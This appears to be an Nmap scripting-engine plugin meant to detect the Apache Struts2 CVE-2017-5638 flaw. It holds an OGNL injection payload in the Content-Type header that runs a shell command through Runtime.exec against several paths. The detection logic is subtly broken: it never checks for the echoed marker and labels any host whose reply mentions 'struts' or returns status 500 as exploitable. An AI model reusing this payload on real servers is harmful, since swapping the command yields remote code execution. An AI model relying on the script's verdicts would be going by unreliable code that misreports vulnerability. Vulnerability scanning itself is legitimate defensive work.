-- Apache Struts2 RCE Detection (CVE-2017-5638)
-- Detects vulnerability to Apache Struts2 remote code execution
-- @output
-- 8080/tcp open  http-proxy
-- | http-vuln-cve2017-5638:
-- |   VULNERABLE:
-- |   Apache Struts2 Remote Code Execution (CVE-2017-5638)
-- |     State: VULNERABLE (Exploitable)
-- |     IDs:  CVE:CVE-2017-5638
-- |     Risk factor: CRITICAL  CVSSv3: 10.0 (CRITICAL)
-- |       Apache Struts 2.3.5 through 2.3.31 and 2.5 through 2.5.10 allows remote attackers
-- |       to execute arbitrary code via a crafted Content-Type header when performing
-- |       file upload operations. This was used in the 2017 Equifax breach.
-- |     
-- |     Disclosure date: 2017-03-06
-- |     References:
-- |       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5638
-- |_      https://www.rapid7.com/db/modules/exploit/multi/http/struts2_content_type_ognl

description = [[
Tests for the Apache Struts2 Jakarta Multipart parser vulnerability (CVE-2017-5638).

This critical vulnerability allows unauthenticated remote code execution and was
famously exploited in the 2017 Equifax data breach.
]]

author = "Nemue Security Team"
license = "MIT"
categories = {"vuln", "intrusive", "exploit"}

portrule = function(host, port)
    return port.service == "http" or port.service == "https" or
           port.number == 8080 or port.number == 8443
end

action = function(host, port)
    local http = require "http"
    
    -- Test paths commonly hosting Struts2 applications
    local test_paths = {
        "/",
        "/struts2-showcase/",
        "/showcase/",
        "/integration/",
        "/admin/",
        "/upload.action"
    }
    
    local marker = "NEMUE_STRUTS_TEST_" .. math.random(10000, 99999)
    
    -- Craft malicious Content-Type header with OGNL injection
    -- Safe test: just echoes our marker string
    local payload = "%{#_='multipart/form-data'}.#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,@java.lang.Runtime@getRuntime().exec('echo " .. marker .. "')"
    
    for _, path in ipairs(test_paths) do
        local options = {
            header = {
                ["Content-Type"] = payload,
                ["User-Agent"] = "Nemue Security Scanner"
            },
            content = "test"
        }
        
        local response = http.post(host, port, path, options)
        
        if response then
            -- Check for OGNL injection indicators
            if response.body and (
                response.body:find("ognl") or
                response.body:find("OgnlException") or
                response.body:find("struts") or
                response.status == 500  -- OGNL errors often cause 500
            ) then
                -- Vulnerable!
                local result = "VULNERABLE:\n"
                result = result .. "Apache Struts2 Remote Code Execution (CVE-2017-5638)\n"
                result = result .. "  State: VULNERABLE (Exploitable)\n"
                result = result .. "  IDs:  CVE:CVE-2017-5638\n"
                result = result .. "  Risk factor: CRITICAL  CVSSv3: 10.0 (CRITICAL)\n"
                result = result .. "    Apache Struts 2.3.5 through 2.3.31 and 2.5 through 2.5.10 allows remote attackers\n"
                result = result .. "    to execute arbitrary code via a crafted Content-Type header when performing\n"
                result = result .. "    file upload operations. This was used in the 2017 Equifax breach.\n"
                result = result .. "  \n"
                result = result .. "  Vulnerable endpoint: " .. path .. "\n"
                result = result .. "  Disclosure date: 2017-03-06\n"
                result = result .. "  References:\n"
                result = result .. "    https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5638\n"
                result = result .. "    https://www.rapid7.com/db/modules/exploit/multi/http/struts2_content_type_ognl"
                return result
            end
        end
    end
    
    return "Not vulnerable to CVE-2017-5638"
end
